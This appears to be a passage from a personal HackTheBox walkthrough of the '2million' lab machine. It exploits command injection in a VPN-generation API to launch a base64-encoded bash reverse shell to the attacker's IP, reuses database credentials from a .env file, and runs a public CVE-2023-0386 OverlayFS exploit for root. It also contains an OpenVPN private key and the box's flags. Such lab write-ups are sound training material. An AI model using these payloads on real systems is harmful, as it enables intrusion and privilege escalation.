22uxy+U4txphof4QPYOerX3IVwKBgQDz3Xa5K4jWpV92S4NjWdHOLGx5m9q/Qcb9
egep+AiGTy2RZiWVxce3CkY9TmYlyMLYWIL6WNIdCwiP5fCN6lT5rAk52TLkqCRS
r4I6aBp5PKpWXp/YKdIDy03XZNzB33jK9ngUfaWVkp/hg385d1Exe0Qho2IwQxpX
CM/f1J31vwKBgEfEEDFz/kYXggOtEPqnkHCz1J3o25fFtcoZSWlxKrrnbh+JVqwt
RQaIeH7sA/A3aYaATNwgPD4VDEEOtN/9/0k41ZJO4H14GxJCICqM7OafedkTeNVM
xSrQupc6GdbOlvLjHui9cWdsW5Ily8Mxp3194luG0IhPRe4CXfIriwI9AoGBAKQb
yhSMhnakLVzHLnECdd1AKfOgfZGtq0LTBytLnjj8OZcaXXqv8VltUZ1aEAWnV/AN
iH7+nM8sqKNlwv9NzceDDWZfkw8rU95M+99gRUiHGb4ryXfHlOw2uXiVCLZzM6+q
M17euzqvxGYXfttmPz6ETHIyqBYAYk5lwLZJN8+zAoGBAMJm51eMDxb/49npB8oO
2/0Bmj+Arnu/ZjJRjhEGvhUBD0ilnDXZ/B3VjqAxtI0z6/jWvXCijnd88xobk4P4
SzyEa0Rb/oBcTj6OWMmlkn7pimiEhLvtAaj8PVpW5D7dr7SnKiTlttc9+AsF4PzO
a9s5UFm4HaVGjRsGte23HDpi
-----END PRIVATE KEY-----
</key>
<tls-auth>
#
# 2048 bit OpenVPN static key
#
-----BEGIN OpenVPN Static key V1-----
45df64cdd950c711636abdb1f78c058c
358730b4f3bcb119b03e43c46a856444
05e96eaed55755e3eef41cd21538d041
079c0fc8312517d851195139eceb458b
f8ff28ba7d46ef9ce65f13e0e259e5e3
068a47535cd80980483a64d16b7d10ca
574bb34c7ad1490ca61d1f45e5987e26
7952930b85327879cc0333bb96999abe
2d30e4b592890149836d0f1eacd2cb8c
a67776f332ec962bc22051deb9a94a78
2b51bafe2da61c3dc68bbdd39fa35633
e511535e57174665a2495df74f186a83
479944660ba924c91dd9b00f61bc09f5
2fe7039aa114309111580bc5c910b4ac
c9efb55a3f0853e4b6244e3939972ff6
bfd36c19a809981c06a91882b6800549
-----END OpenVPN Static key V1-----
</tls-auth>

What API endpoint can change a user account to an admin account?
/api/v1/admin/settings/update

What API endpoint has a command injection vulnerability in it?
/api/v1/admin/vpn/generate

┌──(witty㉿kali)-[~/Downloads]
└─$ curl -sX POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=r9odt6i96ggnvrqknfq6fu59oh" --header "Content-Type: application/json" --data '{"username":"test1;id;"}'
uid=33(www-data) gid=33(www-data) groups=33(www-data)

┌──(witty㉿kali)-[~/Downloads]
└─$ echo "bash -i >& /dev/tcp/10.10.14.26/1337 0>&1" | base64 -w0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNi8xMzM3IDA+JjEK  

┌──(witty㉿kali)-[~/Downloads]
└─$ curl -sX POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=r9odt6i96ggnvrqknfq6fu59oh" --header "Content-Type: application/json" --data '{"username":"test1;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNi8xMzM3IDA+JjEK | base64 -d | bash;"}'

┌──(root㉿kali)-[/home/witty/Downloads]
└─# rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.26] from (UNKNOWN) [10.10.11.221] 37100
bash: cannot set terminal process group (1157): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2million:~/html$ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
</bash')" || /usr/bin/script -qc /bin/bash /dev/null
www-data@2million:~/html$ ls -lah
ls -lah
total 56K
drwxr-xr-x 10 root root 4.0K Jul 29 01:10 .
drwxr-xr-x  3 root root 4.0K Jun  6 10:22 ..
-rw-r--r--  1 root root   87 Jun  2 18:56 .env
-rw-r--r--  1 root root 1.3K Jun  2 16:15 Database.php
-rw-r--r--  1 root root 2.8K Jun  2 16:15 Router.php
drwxr-xr-x  5 root root 4.0K Jul 29 01:10 VPN
drwxr-xr-x  2 root root 4.0K Jun  6 10:22 assets
drwxr-xr-x  2 root root 4.0K Jun  6 10:22 controllers
drwxr-xr-x  5 root root 4.0K Jun  6 10:22 css
drwxr-xr-x  2 root root 4.0K Jun  6 10:22 fonts
drwxr-xr-x  2 root root 4.0K Jun  6 10:22 images
-rw-r--r--  1 root root 2.7K Jun  2 18:57 index.php
drwxr-xr-x  3 root root 4.0K Jun  6 10:22 js
drwxr-xr-x  2 root root 4.0K Jun  6 10:22 views
www-data@2million:~/html$ cat .env
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123

What file is commonly used in PHP applications to store environment variable values?
.env

www-data@2million:~/html$ cat /etc/passwd | grep "/home"
cat /etc/passwd | grep "/home"
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
admin:x:1000:1000::/home/admin:/bin/bash

www-data@2million:~/html$ su admin
su admin
Password: SuperDuperPass123

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@2million:/var/www/html$ cd /home/admin
cd /home/admin
admin@2million:~$ ls
ls
exp  fuse  gc  ovlcap  snap  user.txt
admin@2million:~$ cat user.txt
cat user.txt
f3578e9d075a8dbed6a5e34637fd3f6d

admin@2million:~$ cd /var
cd /var
admin@2million:/var$ ls
ls
backups  crash  local  log   opt  snap   tmp
cache    lib    lock   mail  run  spool  www
admin@2million:/var$ cd mail
cd mail
admin@2million:/var/mail$ ls
ls
admin
admin@2million:/var/mail$ cat admin
cat admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather

admin@2million:/var/mail$ uname -a
uname -a
Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux

admin@2million:/var/mail$ lsb_release -a
lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 22.04.2 LTS
Release:	22.04
Codename:	jammy

The affected kernel versions for jammy go up to 5.15.0-70.77

https://github.com/xkaneiki/CVE-2023-0386

┌──(witty㉿kali)-[~/Downloads]
└─$ git clone https://github.com/xkaneiki/CVE-2023-0386.git
Cloning into 'CVE-2023-0386'...
remote: Enumerating objects: 24, done.
remote: Counting objects: 100% (24/24), done.
remote: Compressing objects: 100% (15/15), done.
remote: Total 24 (delta 7), reused 21 (delta 5), pack-reused 0
Receiving objects: 100% (24/24), 426.11 KiB | 461.00 KiB/s, done.
Resolving deltas: 100% (7/7), done.
                                                                                     
┌──(witty㉿kali)-[~/Downloads]
└─$ cd CVE-2023-0386 
                                                                                     
┌──(witty㉿kali)-[~/Downloads/CVE-2023-0386]
└─$ ls
exp.c  fuse.c  getshell.c  Makefile  ovlcap  README.md  test

┌──(witty㉿kali)-[~/Downloads]
└─$ zip -r cve.zip CVE-2023-0386
  adding: CVE-2023-0386/ (stored 0%)
  adding: CVE-2023-0386/test/ (stored 0%)
  adding: CVE-2023-0386/test/mnt (deflated 82%)
  adding: CVE-2023-0386/test/fuse_test.c (deflated 74%)
  adding: CVE-2023-0386/test/mnt.c (deflated 62%)
  adding: CVE-2023-0386/exp.c (deflated 64%)
  adding: CVE-2023-0386/ovlcap/ (stored 0%)
  adding: CVE-2023-0386/ovlcap/.gitkeep (stored 0%)
  adding: CVE-2023-0386/README.md (deflated 23%)
  adding: CVE-2023-0386/getshell.c (deflated 58%)
  adding: CVE-2023-0386/.git/ (stored 0%)
  adding: CVE-2023-0386/.git/branches/ (stored 0%)
  adding: CVE-2023-0386/.git/refs/ (stored 0%)
  adding: CVE-2023-0386/.git/refs/remotes/ (stored 0%)
  adding: CVE-2023-0386/.git/refs/remotes/origin/ (stored 0%)
  adding: CVE-2023-0386/.git/refs/remotes/origin/HEAD (stored 0%)
  adding: CVE-2023-0386/.git/refs/heads/ (stored 0%)
  adding: CVE-2023-0386/.git/refs/heads/main (stored 0%)
  adding: CVE-2023-0386/.git/refs/tags/ (stored 0%)
  adding: CVE-2023-0386/.git/objects/ (stored 0%)
  adding: CVE-2023-0386/.git/objects/pack/ (stored 0%)
  adding: CVE-2023-0386/.git/objects/pack/pack-fdcfb3c1c347e6514a19736a09517b8100eb5c49.pack (deflated 0%)
  adding: CVE-2023-0386/.git/objects/pack/pack-fdcfb3c1c347e6514a19736a09517b8100eb5c49.idx (deflated 54%)
  adding: CVE-2023-0386/.git/objects/info/ (stored 0%)
  adding: CVE-2023-0386/.git/info/ (stored 0%)
  adding: CVE-2023-0386/.git/info/exclude (deflated 28%)
  adding: CVE-2023-0386/.git/hooks/ (stored 0%)
  adding: CVE-2023-0386/.git/hooks/pre-applypatch.sample (deflated 38%)
  adding: CVE-2023-0386/.git/hooks/pre-receive.sample (deflated 40%)
  adding: CVE-2023-0386/.git/hooks/prepare-commit-msg.sample (deflated 50%)
  adding: CVE-2023-0386/.git/hooks/commit-msg.sample (deflated 44%)
  adding: CVE-2023-0386/.git/hooks/post-update.sample (deflated 27%)
  adding: CVE-2023-0386/.git/hooks/pre-commit.sample (deflated 45%)
  adding: CVE-2023-0386/.git/hooks/pre-rebase.sample (deflated 59%)
  adding: CVE-2023-0386/.git/hooks/applypatch-msg.sample (deflated 42%)
  adding: CVE-2023-0386/.git/hooks/fsmonitor-watchman.sample (deflated 62%)
  adding: CVE-2023-0386/.git/hooks/push-to-checkout.sample (deflated 55%)
  adding: CVE-2023-0386/.git/hooks/pre-push.sample (deflated 49%)
  adding: CVE-2023-0386/.git/hooks/update.sample (deflated 68%)
  adding: CVE-2023-0386/.git/hooks/pre-merge-commit.sample (deflated 39%)
  adding: CVE-2023-0386/.git/description (deflated 14%)
  adding: CVE-2023-0386/.git/index (deflated 35%)
  adding: CVE-2023-0386/.git/config (deflated 30%)
  adding: CVE-2023-0386/.git/packed-refs (deflated 12%)
  adding: CVE-2023-0386/.git/logs/ (stored 0%)
  adding: CVE-2023-0386/.git/logs/refs/ (stored 0%)
  adding: CVE-2023-0386/.git/logs/refs/remotes/ (stored 0%)
  adding: CVE-2023-0386/.git/logs/refs/remotes/origin/ (stored 0%)
  adding: CVE-2023-0386/.git/logs/refs/remotes/origin/HEAD (deflated 26%)
  adding: CVE-2023-0386/.git/logs/refs/heads/ (stored 0%)
  adding: CVE-2023-0386/.git/logs/refs/heads/main (deflated 26%)
  adding: CVE-2023-0386/.git/logs/HEAD (deflated 26%)
  adding: CVE-2023-0386/.git/HEAD (stored 0%)
  adding: CVE-2023-0386/Makefile (deflated 20%)
  adding: CVE-2023-0386/fuse.c (deflated 68%)

┌──(witty㉿kali)-[~/Downloads]
└─$ scp cve.zip admin@2million.htb:/tmp
The authenticity of host '2million.htb (10.10.11.221)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '2million.htb' (ED25519) to the list of known hosts.
admin@2million.htb's password: 
cve.zip                                            100%  459KB  47.8KB/s   00:09   

admin@2million:/var/mail$ cd /tmp
cd /tmp
admin@2million:/tmp$ ls
ls
cve.zip
linepeas.sh
ovlcap
pspy64
snap-private-tmp
systemd-private-6ffaeddfe2d443d09e18cecb19f724fe-memcached.service-bkyxks
systemd-private-6ffaeddfe2d443d09e18cecb19f724fe-ModemManager.service-I6HeEz
systemd-private-6ffaeddfe2d443d09e18cecb19f724fe-systemd-logind.service-vqSfSa
systemd-private-6ffaeddfe2d443d09e18cecb19f724fe-systemd-resolved.service-rDyIAr
systemd-private-6ffaeddfe2d443d09e18cecb19f724fe-systemd-timesyncd.service-aEBaKS
systemd-private-6ffaeddfe2d443d09e18cecb19f724fe-upower.service-KTrDHP
tmux-1000
tmux-33
vmware-root_627-4013264619
admin@2million:/tmp$ unzip cve.zip
unzip cve.zip
Archive:  cve.zip
   creating: CVE-2023-0386/
   creating: CVE-2023-0386/test/
  inflating: CVE-2023-0386/test/mnt  
  inflating: CVE-2023-0386/test/fuse_test.c  
  inflating: CVE-2023-0386/test/mnt.c  
  inflating: CVE-2023-0386/exp.c     
   creating: CVE-2023-0386/ovlcap/
 extracting: CVE-2023-0386/ovlcap/.gitkeep  
  inflating: CVE-2023-0386/README.md  
  inflating: CVE-2023-0386/getshell.c  
   creating: CVE-2023-0386/.git/
   creating: CVE-2023-0386/.git/branches/
   creating: CVE-2023-0386/.git/refs/
   creating: CVE-2023-0386/.git/refs/remotes/
   creating: CVE-2023-0386/.git/refs/remotes/origin/
 extracting: CVE-2023-0386/.git/refs/remotes/origin/HEAD  
   creating: CVE-2023-0386/.git/refs/heads/
 extracting: CVE-2023-0386/.git/refs/heads/main  
   creating: CVE-2023-0386/.git/refs/tags/
   creating: CVE-2023-0386/.git/objects/
   creating: CVE-2023-0386/.git/objects/pack/
  inflating: CVE-2023-0386/.git/objects/pack/pack-fdcfb3c1c347e6514a19736a09517b8100eb5c49.pack  
  inflating: CVE-2023-0386/.git/objects/pack/pack-fdcfb3c1c347e6514a19736a09517b8100eb5c49.idx  
   creating: CVE-2023-0386/.git/objects/info/
   creating: CVE-2023-0386/.git/info/
  inflating: CVE-2023-0386/.git/info/exclude  
   creating: CVE-2023-0386/.git/hooks/
  inflating: CVE-2023-0386/.git/hooks/pre-applypatch.sample  
  inflating: CVE-2023-0386/.git/hooks/pre-receive.sample  
  inflating: CVE-2023-0386/.git/hooks/prepare-commit-msg.sample  
  inflating: CVE-2023-0386/.git/hooks/commit-msg.sample  
  inflating: CVE-2023-0386/.git/hooks/post-update.sample  
  inflating: CVE-2023-0386/.git/hooks/pre-commit.sample  
  inflating: CVE-2023-0386/.git/hooks/pre-rebase.sample  
  inflating: CVE-2023-0386/.git/hooks/applypatch-msg.sample  
  inflating: CVE-2023-0386/.git/hooks/fsmonitor-watchman.sample  
  inflating: CVE-2023-0386/.git/hooks/push-to-checkout.sample  
  inflating: CVE-2023-0386/.git/hooks/pre-push.sample  
  inflating: CVE-2023-0386/.git/hooks/update.sample  
  inflating: CVE-2023-0386/.git/hooks/pre-merge-commit.sample  
  inflating: CVE-2023-0386/.git/description  
  inflating: CVE-2023-0386/.git/index  
  inflating: CVE-2023-0386/.git/config  
  inflating: CVE-2023-0386/.git/packed-refs  
   creating: CVE-2023-0386/.git/logs/
   creating: CVE-2023-0386/.git/logs/refs/
   creating: CVE-2023-0386/.git/logs/refs/remotes/
   creating: CVE-2023-0386/.git/logs/refs/remotes/origin/
  inflating: CVE-2023-0386/.git/logs/refs/remotes/origin/HEAD  
   creating: CVE-2023-0386/.git/logs/refs/heads/
  inflating: CVE-2023-0386/.git/logs/refs/heads/main  
  inflating: CVE-2023-0386/.git/logs/HEAD  
 extracting: CVE-2023-0386/.git/HEAD  
  inflating: CVE-2023-0386/Makefile  
  inflating: CVE-2023-0386/fuse.c  

admin@2million:/tmp$ cd CVE-2023-0386
cd CVE-2023-0386
admin@2million:/tmp/CVE-2023-0386$ make all
make all
gcc fuse.c -o fuse -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl
fuse.c: In function ‘read_buf_callback’:
fuse.c:106:21: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘off_t’ {aka ‘long int’} [-Wformat=]
  106 |     printf("offset %d\n", off);
      |                    ~^     ~~~
      |                     |     |
      |                     int   off_t {aka long int}
      |                    %ld
fuse.c:107:19: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘size_t’ {aka ‘long unsigned int’} [-Wformat=]
  107 |     printf("size %d\n", size);
      |                  ~^     ~~~~
      |                   |     |
      |                   int   size_t {aka long unsigned int}
      |                  %ld
fuse.c: In function ‘main’:
fuse.c:214:12: warning: implicit declaration of function ‘read’; did you mean ‘fread’? [-Wimplicit-function-declaration]
  214 |     while (read(fd, content + clen, 1) > 0)
      |            ^~~~
      |            fread
fuse.c:216:5: warning: implicit declaration of function ‘close’; did you mean ‘pclose’? [-Wimplicit-function-declaration]
  216 |     close(fd);
      |     ^~~~~
      |     pclose
fuse.c:221:5: warning: implicit declaration of function ‘rmdir’ [-Wimplicit-function-declaration]
  221 |     rmdir(mount_path);
      |     ^~~~~
/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/11/../../../x86_64-linux-gnu/libfuse.a(fuse.o): in function `fuse_new_common':
(.text+0xaf4e): warning: Using 'dlopen' in statically linked applications requires at runtime the shared libraries from the glibc version used for linking
gcc -o exp exp.c -lcap
gcc -o gc getshell.c

admin@2million:/tmp/CVE-2023-0386$ ./fuse ./ovlcap/lower ./gc &
./fuse ./ovlcap/lower ./gc &
[1] 45098
admin@2million:/tmp/CVE-2023-0386$ [+] len of gc: 0x3ee0
./exp
./exp
uid:1000 gid:1000
[+] mount success
[+] readdir
[+] getattr_callback
/file
total 8
drwxrwxr-x 1 root   root     4096 Jul 29 01:33 .
drwxr-xr-x 6 root   root     4096 Jul 29 01:33 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] open_callback
/file
[+] read buf callback
offset 0
size 16384
path /file
[+] open_callback
/file
[+] open_callback
/file
[+] ioctl callback
path /file
cmd 0x80086601
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@2million:/tmp/CVE-2023-0386# cd /root
cd /root
root@2million:/root# ls
ls
root.txt  snap  thank_you.json
root@2million:/root# cat root.txt
cat root.txt
e64826a6d8e20d00ae7acfdb04c56742

What is the email address of the sender of the email sent to admin?
ch4p@2million.htb

What is the 2023 CVE ID for a vulnerability in that allows an attacker to move files in the Overlay file system while maintaining metadata like the owner and SetUID bits?

CVE-2023-0386

root@2million:/root# cat thank_you.json
cat thank_you.json
{"encoding": "url", "data": "%7B%22encoding%22:%20%22hex%22,%20%22data%22:%20%227b22656e6372797074696f6e223a2022786f72222c2022656e6372707974696f6e5f6b6579223a20224861636b546865426f78222c2022656e636f64696e67223a2022626173653634222c202264617461223a20224441514347585167424345454c43414549515173534359744168553944776f664c5552765344676461414152446e51634454414746435145423073674230556a4152596e464130494d556745596749584a51514e487a7364466d494345535145454238374267426942685a6f4468595a6441494b4e7830574c526844487a73504144594848547050517a7739484131694268556c424130594d5567504c525a594b513848537a4d614244594744443046426b6430487742694442306b4241455a4e527741596873514c554543434477424144514b4653305046307337446b557743686b7243516f464d306858596749524a41304b424470494679634347546f4b41676b344455553348423036456b4a4c4141414d4d5538524a674952446a41424279344b574334454168393048776f334178786f44777766644141454e4170594b67514742585159436a456345536f4e426b736a41524571414130385151594b4e774246497745636141515644695952525330424857674f42557374427842735a58494f457777476442774e4a30384f4c524d61537a594e4169734246694550424564304941516842437767424345454c45674e497878594b6751474258514b45437344444767554577513653424571436c6771424138434d5135464e67635a50454549425473664353634c4879314245414d31476777734346526f416777484f416b484c52305a5041674d425868494243774c574341414451386e52516f73547830774551595a5051304c495170594b524d47537a49644379594f4653305046776f345342457454776774457841454f676b4a596734574c4545544754734f414445634553635041676430447863744741776754304d2f4f7738414e6763644f6b31444844464944534d5a48576748444267674452636e4331677044304d4f4f68344d4d4141574a51514e48335166445363644857674944515537486751324268636d515263444a6745544a7878594b5138485379634444433444433267414551353041416f734368786d5153594b4e7742464951635a4a41304742544d4e525345414654674e4268387844456c6943686b7243554d474e51734e4b7745646141494d425355644144414b48475242416755775341413043676f78515241415051514a59674d644b524d4e446a424944534d635743734f4452386d4151633347783073515263456442774e4a3038624a773050446a63634444514b57434550467734344241776c4368597242454d6650416b5259676b4e4c51305153794141444446504469454445516f36484555684142556c464130434942464c534755734a304547436a634152534d42484767454651346d45555576436855714242464c4f7735464e67636461436b434344383844536374467a424241415135425241734267777854554d6650416b4c4b5538424a785244445473615253414b4553594751777030474151774731676e42304d6650414557596759574b784d47447a304b435364504569635545515578455574694e68633945304d494f7759524d4159615052554b42446f6252536f4f4469314245414d314741416d5477776742454d644d526f6359676b5a4b684d4b4348514841324941445470424577633148414d744852566f414130506441454c4d5238524f67514853794562525459415743734f445238394268416a4178517851516f464f676354497873646141414e4433514e4579304444693150517a777853415177436c67684441344f4f6873414c685a594f424d4d486a424943695250447941414630736a4455557144673474515149494e7763494d674d524f776b47443351634369554b44434145455564304351736d547738745151594b4d7730584c685a594b513858416a634246534d62485767564377353043776f334151776b424241596441554d4c676f4c5041344e44696449484363625744774f51776737425142735a5849414242454f637874464e67425950416b47537a6f4e48545a504779414145783878476b6c694742417445775a4c497731464e5159554a45454142446f6344437761485767564445736b485259715477776742454d4a4f78304c4a67344b49515151537a734f525345574769305445413433485263724777466b51516f464a78674d4d41705950416b47537a6f4e48545a504879305042686b31484177744156676e42304d4f4941414d4951345561416b434344384e467a464457436b50423073334767416a4778316f41454d634f786f4a4a6b385049415152446e514443793059464330464241353041525a69446873724242415950516f4a4a30384d4a304543427a6847623067344554774a517738784452556e4841786f4268454b494145524e7773645a477470507a774e52516f4f47794d3143773457427831694f78307044413d3d227d%22%7D"}

smart decode

{"encoding": "url", "data": "{"encoding": "hex", "data": "7b22656e6372797074696f6e223a2022786f72222c2022656e6372707974696f6e5f6b6579223a20224861636b546865426f78222c2022656e636f64696e67223a2022626173653634222c202264617461223a20224441514347585167424345454c43414549515173534359744168553944776f664c5552765344676461414152446e51634454414746435145423073674230556a4152596e464130494d556745596749584a51514e487a7364466d494345535145454238374267426942685a6f4468595a6441494b4e7830574c526844487a73504144594848547050517a7739484131694268556c424130594d5567504c525a594b513848537a4d614244594744443046426b6430487742694442306b4241455a4e527741596873514c554543434477424144514b4653305046307337446b557743686b7243516f464d306858596749524a41304b424470494679634347546f4b41676b344455553348423036456b4a4c4141414d4d5538524a674952446a41424279344b574334454168393048776f334178786f44777766644141454e4170594b67514742585159436a456345536f4e426b736a41524571414130385151594b4e774246497745636141515644695952525330424857674f42557374427842735a58494f457777476442774e4a30384f4c524d61537a594e4169734246694550424564304941516842437767424345454c45674e497878594b6751474258514b45437344444767554577513653424571436c6771424138434d5135464e67635a50454549425473664353634c4879314245414d31476777734346526f416777484f416b484c52305a5041674d425868494243774c574341414451386e52516f73547830774551595a5051304c495170594b524d47537a49644379594f4653305046776f345342457454776774457841454f676b4a596734574c4545544754734f414445634553635041676430447863744741776754304d2f4f7738414e6763644f6b31444844464944534d5a48576748444267674452636e4331677044304d4f4f68344d4d4141574a51514e48335166445363644857674944515537486751324268636d515263444a6745544a7878594b5138485379634444433444433267414551353041416f734368786d5153594b4e7742464951635a4a41304742544d4e525345414654674e4268387844456c6943686b7243554d474e51734e4b7745646141494d425355644144414b48475242416755775341413043676f78515241415051514a59674d644b524d4e446a424944534d635743734f4452386d4151633347783073515263456442774e4a3038624a773050446a63634444514b57434550467734344241776c4368597242454d6650416b5259676b4e4c51305153794141444446504469454445516f36484555684142556c464130434942464c534755734a304547436a634152534d42484767454651346d45555576436855714242464c4f7735464e67636461436b434344383844536374467a424241415135425241734267777854554d6650416b4c4b5538424a785244445473615253414b4553594751777030474151774731676e42304d6650414557596759574b784d47447a304b435364504569635545515578455574694e68633945304d494f7759524d4159615052554b42446f6252536f4f4469314245414d314741416d5477776742454d644d526f6359676b5a4b684d4b4348514841324941445470424577633148414d744852566f414130506441454c4d5238524f67514853794562525459415743734f445238394268416a4178517851516f464f676354497873646141414e4433514e4579304444693150517a777853415177436c67684441344f4f6873414c685a594f424d4d486a424943695250447941414630736a4455557144673474515149494e7763494d674d524f776b47443351634369554b44434145455564304351736d547738745151594b4d7730584c685a594b513858416a634246534d62485767564377353043776f334151776b424241596441554d4c676f4c5041344e44696449484363625744774f51776737425142735a5849414242454f637874464e67425950416b47537a6f4e48545a504779414145783878476b6c694742417445775a4c497731464e5159554a45454142446f6344437761485767564445736b485259715477776742454d4a4f78304c4a67344b49515151537a734f525345574769305445413433485263724777466b51516f464a78674d4d41705950416b47537a6f4e48545a504879305042686b31484177744156676e42304d4f4941414d4951345561416b434344384e467a464457436b50423073334767416a4778316f41454d634f786f4a4a6b385049415152446e514443793059464330464241353041525a69446873724242415950516f4a4a30384d4a304543427a6847623067344554774a517738784452556e4841786f4268454b494145524e7773645a477470507a774e52516f4f47794d3143773457427831694f78307044413d3d227d"}"}

from hex

{"encryption": "xor", "encrpytion_key": "HackTheBox", "encoding": "base64", "data": "DAQCGXQgBCEELCAEIQQsSCYtAhU9DwofLURvSDgdaAARDnQcDTAGFCQEB0sgB0UjARYnFA0IMUgEYgIXJQQNHzsdFmICESQEEB87BgBiBhZoDhYZdAIKNx0WLRhDHzsPADYHHTpPQzw9HA1iBhUlBA0YMUgPLRZYKQ8HSzMaBDYGDD0FBkd0HwBiDB0kBAEZNRwAYhsQLUECCDwBADQKFS0PF0s7DkUwChkrCQoFM0hXYgIRJA0KBDpIFycCGToKAgk4DUU3HB06EkJLAAAMMU8RJgIRDjABBy4KWC4EAh90Hwo3AxxoDwwfdAAENApYKgQGBXQYCjEcESoNBksjAREqAA08QQYKNwBFIwEcaAQVDiYRRS0BHWgOBUstBxBsZXIOEwwGdBwNJ08OLRMaSzYNAisBFiEPBEd0IAQhBCwgBCEELEgNIxxYKgQGBXQKECsDDGgUEwQ6SBEqClgqBA8CMQ5FNgcZPEEIBTsfCScLHy1BEAM1GgwsCFRoAgwHOAkHLR0ZPAgMBXhIBCwLWCAADQ8nRQosTx0wEQYZPQ0LIQpYKRMGSzIdCyYOFS0PFwo4SBEtTwgtExAEOgkJYg4WLEETGTsOADEcEScPAgd0DxctGAwgT0M/Ow8ANgcdOk1DHDFIDSMZHWgHDBggDRcnC1gpD0MOOh4MMAAWJQQNH3QfDScdHWgIDQU7HgQ2BhcmQRcDJgETJxxYKQ8HSycDDC4DC2gAEQ50AAosChxmQSYKNwBFIQcZJA0GBTMNRSEAFTgNBh8xDEliChkrCUMGNQsNKwEdaAIMBSUdADAKHGRBAgUwSAA0CgoxQRAAPQQJYgMdKRMNDjBIDSMcWCsODR8mAQc3Gx0sQRcEdBwNJ08bJw0PDjccDDQKWCEPFw44BAwlChYrBEMfPAkRYgkNLQ0QSyAADDFPDiEDEQo6HEUhABUlFA0CIBFLSGUsJ0EGCjcARSMBHGgEFQ4mEUUvChUqBBFLOw5FNgcdaCkCCD88DSctFzBBAAQ5BRAsBgwxTUMfPAkLKU8BJxRDDTsaRSAKESYGQwp0GAQwG1gnB0MfPAEWYgYWKxMGDz0KCSdPEicUEQUxEUtiNhc9E0MIOwYRMAYaPRUKBDobRSoODi1BEAM1GAAmTwwgBEMdMRocYgkZKhMKCHQHA2IADTpBEwc1HAMtHRVoAA0PdAELMR8ROgQHSyEbRTYAWCsODR89BhAjAxQxQQoFOgcTIxsdaAAND3QNEy0DDi1PQzwxSAQwClghDA4OOhsALhZYOBMMHjBICiRPDyAAF0sjDUUqDg4tQQIINwcIMgMROwkGD3QcCiUKDCAEEUd0CQsmTw8tQQYKMw0XLhZYKQ8XAjcBFSMbHWgVCw50Cwo3AQwkBBAYdAUMLgoLPA4NDidIHCcbWDwOQwg7BQBsZXIABBEOcxtFNgBYPAkGSzoNHTZPGyAAEx8xGkliGBAtEwZLIw1FNQYUJEEABDocDCwaHWgVDEskHRYqTwwgBEMJOx0LJg4KIQQQSzsORSEWGi0TEA43HRcrGwFkQQoFJxgMMApYPAkGSzoNHTZPHy0PBhk1HAwtAVgnB0MOIAAMIQ4UaAkCCD8NFzFDWCkPB0s3GgAjGx1oAEMcOxoJJk8PIAQRDnQDCy0YFC0FBA50ARZiDhsrBBAYPQoJJ08MJ0ECBzhGb0g4ETwJQw8xDRUnHAxoBhEKIAERNwsdZGtpPzwNRQoOGyM1Cw4WBx1iOx0pDA=="}

xored utf-8 with base64

Dear HackTheBox Community,

We are thrilled to announce a momentous milestone in our journey together. With immense joy and gratitude, we celebrate the achievement of reaching 2 million remarkable users! This incredible feat would not have been possible without each and every one of you.

From the very beginning, HackTheBox has been built upon the belief that knowledge sharing, collaboration, and hands-on experience are fundamental to personal and professional growth. Together, we have fostered an environment where innovation thrives and skills are honed. Each challenge completed, each machine conquered, and every skill learned has contributed to the collective intelligence that fuels this vibrant community.

To each and every member of the HackTheBox community, thank you for being a part of this incredible journey. Your contributions have shaped the very fabric of our platform and inspired us to continually innovate and evolve. We are immensely proud of what we have accomplished together, and we eagerly anticipate the countless milestones yet to come.

Here's to the next chapter, where we will continue to push the boundaries of cybersecurity, inspire the next generation of ethical hackers, and create a world where knowledge is accessible to all.

With deepest gratitude,

The HackTheBox Team


```
![[Pasted image 20230728194213.png]]

[[Busqueda]]